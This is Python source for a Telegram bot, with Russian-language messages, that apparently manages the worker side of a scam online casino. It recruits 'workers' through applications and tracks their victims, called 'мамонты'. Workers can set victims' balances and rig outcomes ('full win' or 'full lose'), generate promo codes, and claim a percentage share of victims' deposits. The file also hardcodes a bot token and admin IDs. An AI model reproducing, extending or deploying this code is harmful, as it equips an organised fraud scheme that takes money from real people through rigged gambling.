import telebot
from telebot import types

from casino_config import message_to_users, accept_receive_mamonts, phone, token, mailing
from misc import repl, replcode, replphone, repldate, bill_create, isfloat, repl_percent, repl_share

import configparser

import threading, random, string, requests, sqlite3, database, keyboard

from time import sleep
from datetime import datetime, timedelta


bot = telebot.TeleBot('5217838205:AAG47gLt2F7ahdm1sJzIEIulPsxwhIEqDEY') # Токен бота воркеров

admin = 5086068572 # ID Админа
support = 1345090697 # ID сапорта
channel_id = -1001389244708 # ID Канала залётов
chat_worker_id = -505572749 # ID Чата с воркерами

bot_name = 'GudTor' # Username Бота

mater = 'https://t.me/+UTQdrOyYVxo0ODAy' # Ссылка на мануалы
zalet = 'https://t.me/+_f5AnkyLNNA2OTFi' # Ссылка на канал с залётами
infos = 'https://t.me/+ddJNiUAR_TpiZGEy' # Ссылка на инфо канал
pname = 'GudTor' # Название проекта
pdate = '28.02.2022' # Дата созданя проекта


config = configparser.ConfigParser()
config.read("default.ini")

percent  = config['Telegram']['pay']
percent_support = config['Telegram']['pay_support']
status = config['Telegram']['messages']
chat = config['Telegram']['chat']
stats = token
number = phone

# Misc

user_dict = {}
class User:
    def __init__(self, infinitive):

        keys = ['url', 'experience', 'time']
        
        for key in keys:
            self.key = None

def emoji(user_id):
	try:

		array = ['🐶', '🐱', '🐭', '🐹', '🐰', '🦊', '🐻', '🐼', '🐨', '🐯', '🦁', '🐮', '🐷', '🐸']
		choice = random.choice(array)

		bot.send_message(user_id, choice)

	except:
		pass

# Admin function

def ticket(call):
	try:
		user = user_dict[call.message.chat.id]

		inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
		inline_1 = types.InlineKeyboardButton(text = "Принять заявку", callback_data = 'ACCEPT_TICKET')
		inline_2 = types.InlineKeyboardButton(text = "Отклонить заявку", callback_data = 'INACCEPT_TICKET')
		inline_keyboard.add(inline_1, inline_2)

		bot.send_message(admin, f'💁🏻‍♀️ Новая *заявка*!\n\n🚀 Telegram ID: *{call.message.chat.id}*\nПользователь: *@{str(call.message.chat.username)}*\nОпыт работы: *{user.experience}*\nВремя работы: *{user.time}*\nПрофиль: *{user.url}*', 
			parse_mode = "Markdown", reply_markup = inline_keyboard)

		database.user_update_merchant_id(call.message.chat.id, 1)
		bot.send_message(call.message.chat.id, '📨 Ваша заявка *была отправлена*.\nВы получите ответ после решения', parse_mode="Markdown")
	except:
		bot.send_message(call.message.chat.id, "💁🏻‍♀️ Заявка *не найдена*!", parse_mode="Markdown")
		bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.message_id)

def accept(call):
	try:

		message = call.message.text.split('\n')

		id_user = message[2].split(':')
		id_user = id_user[1].replace(' ', '')
		code = replcode(id_user)
		phone = replphone()

		bot.send_message(id_user, '❤️ Ваша заявка *была принята*!\nВам доступно меню воркера\n\nСсылка на чат в вкладке «О проекте»', parse_mode="Markdown", reply_markup=keyboard.main_keyboard())
		database.user_update_merchant_id(id_user, 2)
		database.user_add_workers(id_user, code, phone)

		bot.answer_callback_query(callback_query_id=call.id, show_alert=False, text="💁🏻‍♀️ Вы приняли пользователя")
	except:
		pass

def inaccept(call):
	try:
		message = call.message.text.split('\n')

		id_user = message[2].split(':')
		id_user = id_user[1].replace(' ', '')
		
		inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
		inline_1 = types.InlineKeyboardButton(text = "Подать заявку", callback_data = 'TICKET')
		inline_keyboard.add(inline_1)

		bot.send_message(id_user, '💔 Ваша заявка *была отклонена*\nПодайте заявку позже', parse_mode="Markdown", reply_markup=inline_keyboard)
		database.user_update_merchant_id(id_user, 0)

		bot.answer_callback_query(callback_query_id=call.id, show_alert=False, text="💁🏻‍♀️ Вы отклонили заявку пользователя")
	except:
		pass

def accept_receive(call):
	try:

		data = call.message.text.split('\n')

		telegram_id = data[2].split(':')
		telegram_id = telegram_id[1].replace(' ', '')
		
		price = data[4].split(':')
		price = price[1].replace(' ', '')
		price = price.replace('₽', '')

		database.worker_clear_receive(telegram_id, float(price))
		bot.send_message(telegram_id, f'💞 Запрос на вывод средств *выполнен* (сумма {price} ₽)\n\nОставьте, *пожалуйста*, отзыв:\nhttps://lolz.guru/threads/1887423/', parse_mode="Markdown")
	except:
		pass		

def cancel_receive(call):
	try:

		data = call.message.text.split('\n')

		price = data[4].split(':')
		price = price[1].replace(' ', '')
		price = price.replace('₽', '')

		telegram_id = data[2].split(':')
		telegram_id = telegram_id[1].replace(' ', '')
		
		database.worker_clear_receive(telegram_id, float(price))
		bot.send_message(telegram_id, f'😔 Запрос на вывод средств *отклонен*\nСвяжитесь с тех. поддержкой для выяснения обстоятельств - (сумма {price} ₽)', parse_mode="Markdown")
	except:
		pass	


def edit_chat(message):
	try:

		config = configparser.ConfigParser()
		config.read('default.ini')

		config['Telegram']['chat'] = message.text


		with open('default.ini', 'w') as configfile:
		    config.write(configfile)

		global chat
		chat  = config['Telegram']['chat']

	except:
		pass


def edit_pay(message):
	try:

		config = configparser.ConfigParser()
		config.read('default.ini')

		config['Telegram']['pay'] = message.text


		with open('default.ini', 'w') as configfile:
		    config.write(configfile)

		global percent
		percent  = config['Telegram']['pay']

	except:
		pass

def edit_pay_support(message):
	try:

		config = configparser.ConfigParser()
		config.read('default.ini')

		config['Telegram']['pay_support'] = message.text


		with open('default.ini', 'w') as configfile:
		    config.write(configfile)

		global percent_support
		percent_support  = config['Telegram']['pay_support']

	except:
		pass		

def edit_messages(message):
	try:

		config = configparser.ConfigParser()
		config.read('default.ini')

		config['Telegram']['messages'] = message.text


		with open('default.ini', 'w') as configfile:
		    config.write(configfile)

		global status
		status  = config['Telegram']['messages']

	except:
		pass				

def info_mamont(message, classes):
	try:

		if (message.text.isdigit()) and (classes == '1'):
			num = database.user_num(message.text)
			balance = database.user_balance(message.text)
			status = database.user_status(message.text)
			invite_code = database.user_invite_code(message.text)

			bot.send_message(message.chat.id, f'(ID) - баланс - инвайт код - статус\n\n({num}) - {invite_code} - {balance} ₽ - {status}', parse_mode="Markdown")
		elif (message.text.isdigit()) and (classes == '0'):
			telegram_id = database.user_telegram_id(message.text)
			username = database.user_username(telegram_id)
			balance = database.user_balance(telegram_id)
			status = database.user_status(telegram_id)
			invite_code = database.user_invite_code(telegram_id)
			
			bot.send_message(message.chat.id, f'(ID) - баланс - @username - инвайт код - статус\n\n({message.text}) - @{str(username)} - {invite_code} - {balance} ₽ - {status}', parse_mode="Markdown")


	except:
		pass

def manual_payment(message):
	try:
		if (':' in message.text):
			data = message.text.split(':')
			code = database.worker_code(data[1])

			bot.send_message(channel_id, f'🦋 *Успешное* пополнение\n\n💁🏻‍♀️ Воркер: {str(data[0])}\n\n⚡️ Сумма пополнения: *{data[2]}* ₽\n💸 Доля воркера: ~ *{repl_share(data[2])}* ₽', parse_mode="Markdown")
			bot.send_message(data[1], f'🦋 *Успешное* пополнение\n\n⚡️ Сумма пополнения: *{data[2]}* ₽\n💸 Твоя доля: ~ *{repl_share(data[2])}* ₽', parse_mode="Markdown")

			database.worker_update_profit(data[1], float(data[2]))
			database.user_add_listpay('Ручка', code, repl_percent(data[2]))
	except Exception as e:
		print(e)	

def casino_messages(message):
	try:

		array = database.project_all_id()

		if (message.text != 'Назад'):
			sended = mailing(array, message.text)
			bot.send_message(message.chat.id, f'*Успешная* рассылка, сообщений отправлено - *{sended}*', parse_mode="Markdown")
		else:
			bot.send_message(message.chat.id, '💁🏻‍♀️ *Главное* меню', parse_mode="Markdown", reply_markup=keyboard.main_keyboard())

	except:
		pass

def del_mamont_num(message):
	try:

		if (message.text.isdigit()):
			telegram_id = database.user_telegram_id(message.text)
			database.user_update_invite_code(telegram_id, '0')
			bot.send_message(message.chat.id, '💁🏻‍♀️ Мамонт был *удален*', parse_mode='Markdown')

	except:
		pass

# User function

def user_mamonts(call):
	try:

		code = database.worker_code(call.message.chat.id)
		user_mamont = database.worker_mamonts(code)

		if (len(user_mamont) > 0):
			message = ''
			for key in user_mamont:
				message += key
				message += '\n'

			bot.send_message(call.message.chat.id, f'💁🏻‍♀️ Твои *мамонты* - всего: *{len(user_mamont)}*\n(ID) - @username - баланс - статус (1 - full win, 2 - default, 3 - full lose)\n\n{message}', parse_mode="Markdown")
		else:
			bot.send_message(call.message.chat.id, '💁🏻‍♀️ У Вас нет *мамонтов*', parse_mode="Markdown")

	except:
		pass

def user_delmamonts(call):
	try:
		code = database.worker_code(call.message.chat.id)
		user_mamont = database.user_userid_mamonts(code)

		for user_id in user_mamont:
			database.user_update_invite_code(user_id, '0')

		bot.send_message(call.message.chat.id, '💁🏻‍♀️ Все мамонты *были удалены*', parse_mode="Markdown")
	except:
		pass

def user_delmamonts(call):
	try:
		code = database.worker_code(call.message.chat.id)
		user_mamont = database.user_userid_mamonts(code)

		for user_id in user_mamont:
			database.user_update_invite_code(user_id, '0')

		bot.send_message(call.message.chat.id, '💁🏻‍♀️ Все мамонты *были удалены*', parse_mode="Markdown")
	except:
		pass		

def user_payments(call):
	try:

		code = database.worker_code(call.message.chat.id)
		user_payment = database.worker_payments(code)

		if (len(user_payment) > 0):
			message = ''
			for key in user_payment:
				message += key
				message += '\n'

			bot.send_message(call.message.chat.id, f'💁🏻‍♀️ Твои *залеты* - всего: *{len(user_payment)}*\n_(Telegram ID / тип) - сумма_\n\n{message}', parse_mode="Markdown")
		else:
			bot.send_message(call.message.chat.id, '💁🏻‍♀️ У Вас не было *залетов*', parse_mode="Markdown")

	except:
		pass

def create_promo(message):
	try:

		if (isfloat(message.text) is not False):
			promocode = bill_create(6)

			result = database.user_add_promo(promocode, float(message.text))
			if (result == 1):
				bot.send_message(message.chat.id, f'💁🏻‍♀️ Промокод на сумму *{message.text}* ₽ создан: `{promocode}`\nНажмите на промокод, чтобы его скопировать', parse_mode="Markdown")
		else:
			bot.send_message(message.chat.id, '⚠️ *Неправильная* передача данных', parse_mode="Markdown")

	except:
		pass

def balance_to_user(message):
	try:
		if (':' in message.text):
			data = message.text.split(':')

			telegram_id = database.user_telegram_id(data[0])

			user_code = database.user_invite_code(telegram_id)
			worker_code = database.worker_code(message.chat.id)

			if (user_code == worker_code) or (message.chat.id == support) or (message.chat.id == admin):
				value = float(data[1])

				call = database.user_set_balance(telegram_id, value)

				if (call == 1):
					bot.send_message(message.chat.id, f'💁🏻‍♀️ Баланс был *изменен*\nНовый баланс: {database.user_balance(telegram_id)} ₽', parse_mode="Markdown")
			else:
				bot.send_message(message.chat.id, '⚠️ Данный пользователь записан *не за Вас*!', parse_mode="Markdown")
	except:
		pass

def status_to_user(message):
	try:
		if (':' in message.text):

			data = message.text.split(':')

			telegram_id = database.user_telegram_id(data[0])
			worker_code = database.worker_code(telegram_id)

			if (worker_code == worker_code) or (message.chat.id == support):
				call = database.user_update_status(telegram_id, data[1])

				if (call == 1):
					bot.send_message(message.chat.id, f'💁🏻‍♀️ Статус *изменен*\nНовый статус: {database.user_status(telegram_id)}', parse_mode="Markdown")
			else:
				bot.send_message(message.chat.id, '⚠️ Данный пользователь записан *не за Вас*!', parse_mode="Markdown")
	except:
		pass

def accept_pay_mamonts(telegram_id):
	try:
		accept_receive_mamonts(telegram_id)
	except:
		pass

# Register Next Step Handler

def add_to_fake(telegram_id, amount):
	try:

		database.user_add_fake(telegram_id, amount)

	except:
		pass

def user_forum(message):
	try:
		chat_id = message.chat.id

		if ('https://lolz.guru' not in message.text):
			message = bot.send_message(chat_id, '💁🏻‍♀️ Пожалуйста, отправьте *полную ссылку* на Ваш профиль (_https://lolz.guru/_)', parse_mode="Markdown")
			bot.register_next_step_handler(message, user_forum)
		else:
			user_dict[chat_id] = User(chat_id)
			user = user_dict[chat_id]
			user.url = message.text

			message = bot.send_message(chat_id, '💁🏻‍♀️ Имеется ли у Вас *опыт работы* в данной сфере? Если да, то какой? Делали ли вы профиты и у кого работали?', parse_mode="Markdown")
			bot.register_next_step_handler(message, user_experience)

	except:
		pass

def user_experience(message):
	try:
		chat_id = message.chat.id

		user = user_dict[chat_id]
		user.experience = message.text

		message = bot.send_message(chat_id, '💁🏻‍♀️ Сколько времени Вы *готовы уделять работе* и какого результата вы хотите добиться?', parse_mode="Markdown")
		bot.register_next_step_handler(message, user_time)

	except:
		pass

def user_time(message):
	try:
		chat_id = message.chat.id

		user = user_dict[chat_id]
		user.time = message.text

		inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
		inline_1 = types.InlineKeyboardButton(text = "Отправить заявку", callback_data = 'SEND_TICKET')
		inline_2 = types.InlineKeyboardButton(text = "Отменить заявку", callback_data = 'CANCEL_TICKET')
		inline_keyboard.add(inline_1, inline_2)

		bot.send_message(chat_id, f'💁🏻‍♀️ Ваша заявка *готова к отправке*:\n\nОпыт работы: *{user.experience}*\nВремя работы: *{user.time}*\nПрофиль: *{user.url}*', 
			parse_mode = "Markdown", reply_markup = inline_keyboard)

	except:
		pass

def message_to_user(message):
	try:

		status = message_to_users(message)

		if (status is not False):
			bot.send_message(message.chat.id, '💁🏻‍♀️ Сообщение *отправлено*', parse_mode="Markdown")

	except:
		pass

def worker_receive(message):
	try:
		balance = database.worker_balance(message.chat.id)
		if (':' in message.text):
			data = message.text.split(':')

			if (float(data[0]) <= balance):

				inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
				inline_1 = types.InlineKeyboardButton(text = "Оплатить", callback_data = 'ACCEPT_RECEIVE')
				inline_2 = types.InlineKeyboardButton(text = "Отклонить", callback_data = 'CANCEL_RECEIVE')
				inline_keyboard.add(inline_1, inline_2)

				receive = repl_percent(data[0])
				database.worker_update_receive(message.chat.id, receive)

				bot.send_message(admin, f'💸 Заявка *на вывод*\n\n🚀 Telegram ID: *{message.chat.id}*\nПользователь *@{repl(message.from_user.username)}*\nСумма вывод: *{receive}* ₽\nМетод выплаты: *{data[1]}*\nРеквизиты: *{data[2]}*',
					parse_mode="Markdown", reply_markup=inline_keyboard)
				bot.send_message(message.chat.id, '📨 Ваша заявка *была отправлена*.\nВы получите ответ после решения', parse_mode="Markdown")
			else:
				bot.send_message(message.chat.id, '⚠️ *Не достаточно* средств на балансе', parse_mode="Markdown")

	except:
		pass
